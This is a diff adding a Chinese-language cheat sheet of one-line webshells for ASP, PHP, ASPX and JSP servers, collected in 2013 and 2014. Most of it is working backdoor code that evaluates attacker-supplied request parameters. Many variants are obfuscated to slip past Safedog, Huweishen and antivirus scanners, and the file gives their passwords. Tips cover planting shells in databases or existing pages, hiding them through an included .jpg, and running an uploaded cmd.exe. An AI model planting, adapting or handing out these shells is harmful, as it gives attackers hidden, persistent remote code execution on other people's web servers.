@@ -1,0 +1,326 @@
+主题：一句话木马简单讲解
+
+内容：
+
+1.一句话说明
+常用的一句话有冰狐浪子的一句话，蓝屏的，lack2的，当然还有海洋的。我们如果知道了一句话的原理。自己也可以很轻松的写一个。
+
+<%execute(request("cmd"))%>
+<%execute request("1")%>
+ASP一句话16进制：┼攠數畣整爠煥敵瑳∨≡┩愾  密码a
+
+2.简单演示
+
+1>.一句话你要写入数据库，数据库必须是asp格式或者我们能够通过备份备份为asp格式。用客户端连接这个asp的数据库。
+
+2>.一句话写入文件。我们连接这个文件。这种情况利用起来很难。一般是我们知道对方的源代码。通过分析得知某个功能写入某个文件。
+
+
+
+
+3.一句话图片木马
+
+
+4.其他过滤
+
+这个不再讲，很多种情况，大家可以自主去学习。
+
+
+5.其他常用的一句话
+
+php下的一句话
+<?php eval($_POST[cmd];?>
+
+asp.net下的
+<%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>
+
+jsp下的
+<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%> 
+
+
+
+
+
+
+
+
+2013年收集--------------------------------------------------------------
+
+ PHP过狗：<?php if($_POST[x]!=''){$a="base64_decode"; eval($a($_POST[z0]));}?> 密码：x
+
+
+<%a=request("gold")%><%eval a%>
+一句话
+就有
+过安全狗  和护卫神的
+
+PHP过安全狗一句话：
+
+fuck<?php 
+eval
+($_POST
+[a])
+?>
+
+
+
+
+
+<?php
+$a=range(1,200);$b=chr($a[96]).chr($a[114]).chr($a[114]).chr($a[100]).chr($a[113]).chr($a[115]);
+$b(${chr($a[94]).chr($a[79]).chr($a[78]).chr($a[82]).chr($a[83])}[chr($a[51])]);
+?>    密码 4 
+
+
+
+
+
+
+该日志目录不存在或权限不足，请检查设置！<?php 
+eval
+($_POST
+[a])
+?>
+
+
+过护卫神的。
+<%E=request("1")%>abc
+
+123456789
+<%execute E%>       
+ 
+
+
+ASP过安全狗一句话密码（pass）
+
+ 
+
+<%ShiSan=")╁ssap╁(TSeUQeR LavE"
+ExeCuTe(ShiSanFun(ShiSan))
+dim ShiSan,ShiSanNewstr,ShiSanI
+Function ShiSanFun(ShiSanObjstr)
+ShiSanObjstr = Replace(ShiSanObjstr, "╁", """")
+For ShiSanI = 1 To Len(ShiSanObjstr)
+ If Mid(ShiSanObjstr, ShiSanI, 1) <> "╋" Then
+  ShiSanNewStr = Mid(ShiSanObjstr, ShiSanI, 1) & ShiSanNewStr
+ Else
+  ShiSanNewStr = vbCrLf & ShiSanNewStr
+ End If
+Next
+ShiSanFun = ShiSanNewStr
+End Function%>
+
+ 
+
+ 
+<%a=request("zl")%><%eval a%>
+ 
+
+ 
+
+ 
+
+ 
+
+原来代码是<%execute request("cmd")%>   把标签修改替换下来 为
+
+　　<scriptlanguage=VBScript runat=server>execute request("cmd")</Script> 这样就避开了<%,%>符号！
+
+　　表中数据段限制，一句话木马也写不下的情况
+
+　　网络中流传的最小的木马代码是<%eval request("#")%> 如过连这也写不下怎么办？
+
+　　将木马分开写就好了！   <%Y=request("x")%> <%execute(Y)%>   这样分开写提交到数据库就没问题了！
+
+　　不过，在ACCESS数据库中新增加的数据物理位置是在旧数据之前的，所以要先写<%execute(Y)%>部分。写好后在客户端写密码时除了填写"x"以外的任何字符都可以，如果填了"x"就会出错！
+
+　　插入一句话容易爆错
+
+　　例如
+
+　　Sub unlockPost()
+
+　　Dim id,replyid,rs,posttable
+
+　　id=Request("id")
+
+　　replyid=Request("replyid")
+
+　　If Not IsNumeric(id) or id="" Then
+
+　　写成
+
+　　Sub unlockPost(<%eval request("#")%>)
+
+　　Dim id,replyid,rs,posttable
+
+　　id=Request("id")
+
+　　replyid=Request("replyid")
+
+　　If Not IsNumeric(id) or id="" Then
+
+　　就可以了，也可以写成带容错语句的格式！！
+
+　　<%if request("cmd")<>""then execute request("cmd")%>
+
+　　一句话木马到两句话木马的转型!
+
+　　一句话木马服务端原型:<%execute request("value")%> ,
+
+　　变形后:<%On Error Resume Next execute request("value")%> ,
+
+　　至于为什么要用两句话木马呢,是由于使我们的后门更加隐蔽.
+
+　　我也试过用一句话插入WellShell的某个ASP文件里面,可是访问时经常出错,而插入两句话木马服务端却可以正常访问了,对站点的页面无任何影响.
+
+　　这样就达到了隐蔽性更强的目的了,他管理员总不会连自己的网页文件都删了吧.
+
+　　现在我的WellShell都有这样的后门.选择要插入两句话木马的ASP文件要注意,选一些可以用IE访问的ASP文件,不要选conn.asp这样的文件来插入.
+
+　　当然,连接两句话木马的客户端仍然是用一句木马的客户端,不用修改.
+
+　　一句话免杀：
+
+　　一：变形法
+
+　　比如：eval(request("#"))这样的马儿呢，一般情况下是不被杀的。但实际上，经常杀毒软件会把eval(request列为特征码。所以我们变形一下
+
+　　E=request("id")
+
+　　eval(E)
+
+　　这样可达到免杀的目的。
+
+　　例如：<%execute request("1")%>       变形后：
+
+　　<%E=request("1")
+
+　　execute E%>
+
+　　当然，这种变形是最好做的。
+
+　　介绍第二种方法：因为很多管理员很聪明，它会检查ASP文件中的execute和eval函数。所以呢，不管你怎么反编译，它最终总是要用其中的一个函数来解释运行，所以还是被发现了。好么，我们用外部文件来调用。建一个a.jpg或者任何不被发现的文件后缀或文件名。写入 execute(request("#"))当然，你可以先变形后现放上去。然后在ASP文件中插入
+
+　　<!--#include file="a.jpg" -->
+
+　　来引用它，即可。
+
+　　不过，管理员可以通过对比文件的方式找到修改过的文件，不过这种情况不多。
+
+　　在WEBSHeLL中使用命令提示
+
+　　在使用ASP站长助手6.0时点击命令提示符显示“没有权限”的时候，可以使用ASP站长助手上传CMD.exe到你的WEBSHELL目录（其它目录也行，把上传以后的CMD.exe绝对路径COPY出来），再修改你的WEBSHELL找到调用CMD.EXE的代码。原来的代码如下
+
+　　.exec("cmd.exe /c "&DefCmd).stdout.readall
+
+　　修改为
+
+　　.exec("你想上传的cmd.exe绝对路径" /c"&DefCmd).stdout.readall
+
+　　比如你上传到的目录是D：\web\www\cmd.exe,那么就修改成
+
+　　.exec("D：\web\www\cmd.exe /c"&DefCmd).stdout.readall
+
+
+
+
+2013过狗
+
+
+
+ASP系列   
+
+<%Y=request("xindong")%> <%execute(Y)%>
+
+<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("xindong"))%>
+
+<%eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0"&"-"&"2"&"-"&"5"&")"&")")%>（密码是-7）
+
+
+PHP系列
+
+
+<?php $a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["xindong"]); ?>
+
+<?php $lang = (string)key($_POST);$lang($_POST['xindong']);?>
+
+<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['xindong']);?>
+
+<?php  $a = "a"."s"."s"."e"."r"."t";  $a($_POST["xindong"]);  ?>
+
+<?php                  
+@$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";                  
+@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";                  
+@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}                  
+[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?>    密码是  -7
+
+ASPX系列
+ASPX一句话的 过安全狗效果不怎么样
+
+不过我认为能支持aspx 百分之8/90支持asp
+
+<%@ Page Language = Jscript %>            
+<%var/*-/*-*/P/*-/*-*/=/*-/*-*/"e"+"v"+/*-/*-*/
+"a"+"l"+"("+"R"+"e"+/*-/*-*/"q"+"u"+"e"/*-/*-*/+"s"+"t"+            
+"[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]"+            
+","+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval            
+(/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>    密码   -7
+
+
+<%@ Page Language="Jscript"%><%eval(Request.Item["xindong"],"unsafe");%>
+
+
+<script language="C#" runat="server">           
+WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y("add6bb58e139be10");            
+</script>                                                              密码是webadmin
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+2014年收集------------------------------------------------
+
+支持变异菜刀连接以过安全狗,过啊D 文件扫描的一句话
+
+实已经不是一句话了，好几句了都。
+继续上次的：我使用的一句话的几种姿态
+
+这回研究了下PHP，发一下我使用的一句话（可过文件扫描）。
+
+<?php 
+$mujj = $_POST['z']; if ($mujj!="") { $xsser=base64_decode($_POST['z0']); @eval("\$safedg = $xsser;"); } ?>
+
+密码z，支持菜刀连接；支持变异菜刀连接以过安全狗。
+
+另外：
+
+ASP：
+
+<% Function MorfiCoder(Code) MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf)
+End Function
+Execute MorfiCoder(")/*/z/*/(tseuqer lave") %>
+
+ASPX：
+
+<script runat="server" language="JScript"> function popup(str) { var q = "u"; var w = "afe"; var a = q + "ns" + w; var b= eval(str,a); return(b); } </script> <% popup(popup(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJ6Il0=")))); %>
+
